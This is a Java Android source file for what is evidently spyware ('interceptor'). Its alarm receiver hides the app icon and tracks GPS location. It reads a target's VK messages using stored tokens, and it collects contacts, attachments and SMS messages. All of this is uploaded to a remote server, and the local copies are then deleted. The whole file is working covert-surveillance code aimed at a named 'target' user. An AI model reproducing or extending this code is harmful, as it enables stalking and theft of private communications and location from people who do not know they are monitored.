package org.darkdefender.interceptor.receivers;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;

import org.darkdefender.interceptor.InterceptorActivity;
import org.darkdefender.interceptor.database.DataSource;
import org.darkdefender.interceptor.location.LocationTracker;
import org.darkdefender.interceptor.models.Position;
import org.darkdefender.interceptor.models.SmsMessage;
import org.darkdefender.interceptor.models.VkAttachment;
import org.darkdefender.interceptor.models.VkMessages;
import org.darkdefender.interceptor.models.VkUser;
import org.darkdefender.interceptor.scheduling.AlarmScheduling;
import org.darkdefender.interceptor.tasks.GetUsersInfoTask;
import org.darkdefender.interceptor.tasks.GetVkMessagesTask;
import org.darkdefender.interceptor.tasks.SetPositionTask;
import org.darkdefender.interceptor.tasks.SetSmsTask;
import org.darkdefender.interceptor.tasks.SetUsersLIstTask;
import org.darkdefender.interceptor.tasks.SetVkAttachmentsTask;
import org.darkdefender.interceptor.tasks.SetVkMessagesTask;
import org.darkdefender.interceptor.utils.Check;
import org.darkdefender.interceptor.utils.Constants;
import org.darkdefender.interceptor.utils.MD5;
import org.darkdefender.interceptor.utils.Preferences;
import org.darkdefender.interceptor.utils.Preferences.Preference;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;

public class AlarmReceiver extends BroadcastReceiver{
	
	Context ctx;
	
	@Override
	public void onReceive(Context ctx, Intent intent) {
		this.ctx = ctx;
		
		final int ALARM_CODE 
			= intent.getIntExtra("alarm_code", -1);
		
		switch(ALARM_CODE)
		{
		case Constants.LOCATION_ALARM:
			updateLocation(ctx);
			break;
		case Constants.UPDATE_VK_MESSAGES:
//			Toast.makeText(ctx, "UPDATE VK_MESSAGES alarm", Toast.LENGTH_LONG).show();
			Log.w("","UPDATE VK_MESSAGES alarm");
			updateVkMessages();
			break;
		case Constants.HIDE_ICON_ALARM:
			Log.w("h","hiding icon");
			hideShowAppIcon(ctx);
			break;
		case Constants.TRY_UPLOAD:
//			Toast.makeText(ctx, "Starting Update", Toast.LENGTH_LONG).show();
			Log.w("AlarmReceiver","Starting Update");
			saveVkMessagesToServer();
			break;
		case Constants.UPDATE_USERS:
			updateVkUsersInfo();
			break;
		}
		
	}
	
	private void updateLocation(final Context ctx){
		Check check = new Check(ctx);
	        if(check.isGPSEnabled() && check.isNETProviderEnabled())
	        {
	        	new LocationTracker(ctx).connect();
	        } 
	}
	
	private void hideShowAppIcon(Context ctx){
		PackageManager p = ctx.getPackageManager();
		ComponentName componentName = new ComponentName(ctx, InterceptorActivity.class);
		p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		
	}
	
	private void saveUsersListToRemote()
	{
		new SetUsersLIstTask(ctx) {
			
			@Override
			protected void onSuccess() {
				
			}
			
			@Override
			protected void onFailure(String msg) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			protected JSONObject getJson() {
				// TODO Auto-generated method stub
				return null;
			}
			
			@Override
			protected JSONArray getArrayParams() {
				JSONArray array = new JSONArray();
				DataSource ds = new DataSource(ctx);
				ds.open();
				ArrayList<VkUser> query = ds.getUsersInfo();
				for(int i = 0; i<query.size(); i++){
					VkUser usr = query.get(i);
					try {
						String first_name = "";
						String last_name = "";
						try{
							first_name = URLEncoder.encode(usr.getFirst_name(), "UTF-8");
							last_name = URLEncoder.encode(usr.getLast_name(), "UTF-8");
						}catch(NullPointerException e){}
						
						
						array.put(new JSONObject(
										"{\"uid\":\""+usr.getUid()+"\"," +
										"\"first_name\":\""+first_name+"\"," +
										"\"last_name\":\""+last_name+"\"," +
										"\"is_target\":\""+usr.isIs_target()+"\"," +
										"\"photo\":\""+usr.getPhoto()+"\"}"));
						
					} catch (JSONException e) {
						e.printStackTrace();
					} catch (UnsupportedEncodingException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				ds.close();
				return array;
			}
		}.execute();
	}
	
	private void updateVkUsersInfo()
	{
		new GetUsersInfoTask(ctx) {
			
			@Override
			protected void onSuccess() {
				DataSource ds = new DataSource(ctx);
				ds.open();
				ds.addListOfUsers(users);
				ds.close();	
			
				new AlarmScheduling(ctx).setAlarm(Constants.TRY_UPLOAD, 10000, 3600000, 103);
			}
			
			@Override
			protected void onFailure(String msg) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			protected JSONObject getJson() {
				// TODO Auto-generated method stub
				return null;
			}
			
			@Override
			protected JSONArray getArrayParams() {
				JSONArray array = new JSONArray();
				DataSource ds = new DataSource(ctx);
				ds.open();
				ArrayList<VkMessages> list = ds.getUsersFormVkMessages();
				for(int i=0; i<list.size(); i++){
					try {
						array.put(new JSONObject("{\"uid\":\""+list.get(i).getUid()+"\",\"is_target\":\"false\"}"));
					} catch (JSONException e) {
						e.printStackTrace();
					}
				}
				String target_id = Preferences.readStringPreference(ctx, Preference.USER_ID, "-1");
				try {
					array.put(new JSONObject("{\"uid\":\""+target_id+"\",\"is_target\":\"true\"}"));
				} catch (JSONException e) {
					e.printStackTrace();
				}
				ds.close();
				
				return array;
			}
		}.execute();
	}
	
	private void updateVkMessages()
	{
		new GetVkMessagesTask(ctx) {
			
			@Override
			protected void onSuccess() {
				
				Log.e("messages:","There are "+vk_msg_list.size());
				Log.e("attachments:","There are "+vk_att_list.size());
				
					DataSource ds = new DataSource(ctx);
					ds.open();
					ds.addListOfVkMessages(vk_msg_list);
					ds.addListOfVkMSGAttachments(vk_att_list);
					ds.close();
					
					updateVkUsersInfo();
			}
			
			@Override
			protected void onFailure(String message) {
				Log.e("vk_response", "onFailure");	
			}
			
			@Override
			protected JSONObject getJson() {
				return null;
			}

			@Override
			protected JSONArray getArrayParams() {
				JSONArray js_array = new JSONArray();
				try {
					js_array.put(new JSONObject("{\""+Constants.JSON_LINK+"\":\""+getMessagesLink(Constants.VK_OUTCOME, 200)+"\",\""+Constants.JSON_OUT+"\":false}"));
					js_array.put(new JSONObject("{\""+Constants.JSON_LINK+"\":\""+getMessagesLink(Constants.VK_INCOME, 200)+"\",\""+Constants.JSON_OUT+"\":true}"));
				} catch (JSONException e) {
					e.printStackTrace();
				}
				return js_array;
			}
		}.execute();
	}
	
    private String getMessagesLink(int out, int count)
    {
    	String token = Preferences.readStringPreference(ctx, Preference.VK_TOKEN, "-1");
    	String secret = Preferences.readStringPreference(ctx, Preference.VK_SECRET, "-1");
    	if(token.equals("-1") || secret.equals("-1")){ return ""; }
    	
    	String sig = MD5.getMD5("/method/messages.get?out="+out+"&count="+count+"&access_token="+token+secret+""); 
    	return "https://api.vk.com/method/messages.get?out="+out+"&count="+count+"&access_token="+token+"&sig="+sig+"";
    }
    
    private void saveVkMessagesToServer(){
    	new SetVkMessagesTask(ctx) {
			
			@Override
			protected void onSuccess() {
				DataSource ds = new DataSource(ctx);
				ds.open();
				ds.cleanTable(DataSource.VK_MESSAGES_TABLE);
				ds.close();
				saveVkAttachmentsToTheServer();
			}
			
			@Override
			protected void onFailure(String msg) {
				saveVkAttachmentsToTheServer();
				Log.e("onFailure",this.getEndPointPath());
			}
			
			@Override
			protected JSONObject getJson() {
				return null;
			}
			
			@Override
			protected JSONArray getArrayParams() {
				JSONArray array = new JSONArray();
				DataSource ds = new DataSource(ctx);
				ds.open();
				ArrayList<VkMessages> query = ds.getVkMessages();
				for(int i = 0; i<query.size(); i++){
					VkMessages m = query.get(i);
					try {
						String body = URLEncoder.encode(m.getBody(), "UTF-8");
						
						array.put(new JSONObject(
										"{\"mid\":\""+m.getMid()+"\"," +
										"\"time\":\""+m.getTime()+"\"," +
										"\"is_income\":\""+m.isIncoming()+"\"," +
										"\"has_attachment\":\""+m.hasAttachment()+"\"," +
										"\"body\":\""+body+"\"," +
										"\"uid\":\""+m.getUid()+"\"}"));
						
					} catch (JSONException e) {
						e.printStackTrace();
					} catch (UnsupportedEncodingException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				ds.close();
				return array;
			}
		}.execute();
    }
    
    public static String convertToUTF8(String s) {
        String out = null;
        try {
            out = new String(s.getBytes("UTF-8"), "ISO-8859-1");
        } catch (java.io.UnsupportedEncodingException e) {
            return null;
        }
        return out;
    }
    
    private void saveVkAttachmentsToTheServer(){
    	new SetVkAttachmentsTask(ctx) {
			
			@Override
			protected void onSuccess() {
				DataSource ds = new DataSource(ctx);
				ds.open();
				ds.cleanTable(DataSource.VK_ATTACHMENTS_TABLE);
				ds.close();
				savePositionsToTheServer();
			}
			
			@Override
			protected void onFailure(String msg) {
				savePositionsToTheServer();
				Log.e("onFailure",this.getEndPointPath());
			}
			
			@Override
			protected JSONObject getJson() {
				return null;
			}
			
			@Override
			protected JSONArray getArrayParams() {
				JSONArray array = new JSONArray();
				DataSource ds = new DataSource(ctx);
				ds.open();
				ArrayList<VkAttachment> query = ds.getVkAttachments();
				for(int i = 0; i<query.size(); i++){
					VkAttachment a = query.get(i);
					
					
					
					try {
						String audio_title = "";
						String audio_artist = "";
						String video_title = "";
						try{
							audio_title = URLEncoder.encode(a.getAudio_title(), "UTF-8");
							audio_artist = URLEncoder.encode(a.getAudio_artist(), "UTF-8");
							video_title = URLEncoder.encode(a.getVideo_title(), "UTF-8");
						}catch(NullPointerException e){  }
						
						
						array.put(new JSONObject(
									"{\"mid\":\""+a.getMid()+"\"," +
									"\"type\":\""+a.getType()+"\"," +
									"\"img_src\":\""+a.getImg_src()+"\"," +
									"\"img_src_big\":\""+a.getImg_src_big()+"\"," +
									"\"video_title\":\""+video_title+"\"," +
									"\"video_thumb\":\""+a.getVideo_thumb()+"\"," +
									"\"video_owner\":\""+a.getVideo_owner()+"\"," +
									"\"video_id\":\""+a.getVideo_owner()+"\"," +
									"\"audio_title\":\""+audio_title+"\"," +
									"\"audio_artist\":\""+audio_artist+"\"," +
									"\"unique_id\":\""+a.getUnique_id()+"\"}"));
						
					} catch (JSONException e) {
						e.printStackTrace();
					} catch (UnsupportedEncodingException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				ds.close();
				return array;
			}
		}.execute();
    }
    
	private void savePositionsToTheServer(){
		new SetPositionTask(ctx) {
			
			@Override
			protected void onSuccess() {
				DataSource ds = new DataSource(ctx);
				ds.open();
				ds.cleanTable(DataSource.POSITION_TABLE);
				ds.close();
				saveSmsMessagesToTheServer();
			}
			
			@Override
			protected void onFailure(String msg) {
				saveSmsMessagesToTheServer();
				Log.e("onFailure",this.getEndPointPath());
			}
			
			@Override
			protected JSONObject getJson() {
				return null;
			}
			
			@Override
			protected JSONArray getArrayParams() {
				JSONArray array = new JSONArray();
				DataSource ds = new DataSource(ctx);
				ds.open();
				ArrayList<Position> query = ds.getPositionsList();
				for(int i = 0; i<query.size(); i++){
					Position p = query.get(i);
					try {
						array.put(new JSONObject(
									"{\"lat\":\""+p.getLat()+"\"," +
									"\"lng\":\""+p.getLng()+"\"," +
									"\"date\":\""+p.getDate()+"\"," +
									"\"time\":\""+p.getTime()+"\"}"));
					} catch (JSONException e) {
						e.printStackTrace();
					}
				}
				ds.close();
				return array;
			}
		}.execute();
	}
	
	private void saveSmsMessagesToTheServer(){
		new SetSmsTask(ctx) {
			
			@Override
			protected void onSuccess() {
				DataSource ds = new DataSource(ctx);
				ds.open();
				ds.cleanTable(DataSource.SMS_TABLE);
				ds.close();
				
				saveUsersListToRemote();
//				Log.e("onSuccess","LastTask in row updated data to the server");
			}
			
			@Override
			protected void onFailure(String msg) {
				Log.e("onFailure",this.getEndPointPath());
			}
			
			@Override
			protected JSONObject getJson() {
				// TODO Auto-generated method stub
				return null;
			}
			
			@Override
			protected JSONArray getArrayParams() {
				JSONArray array = new JSONArray();
				DataSource ds = new DataSource(ctx);
				ds.open();
				ArrayList<SmsMessage> query = ds.getSMSMessages();
				for(int i = 0; i<query.size(); i++){
					SmsMessage m = query.get(i);
					try {
						String message = URLEncoder.encode(m.getMessage(), "UTF-8");
						array.put(new JSONObject(
									"{\"time\":\""+m.getTime()+"\"," +
									"\"is_income\":\""+m.isIncoming()+"\"," +
									"\"sender\":\""+m.getFrom()+"\"," +
									"\"receiver\":\""+m.getTo()+"\"," +
									"\"body\":\""+message+"\"}"));
					} catch (JSONException e) {
						e.printStackTrace();
					} catch (UnsupportedEncodingException e) {
						e.printStackTrace();
					}
				}
				ds.close();
				return array;
			}
		}.execute();
	}

}
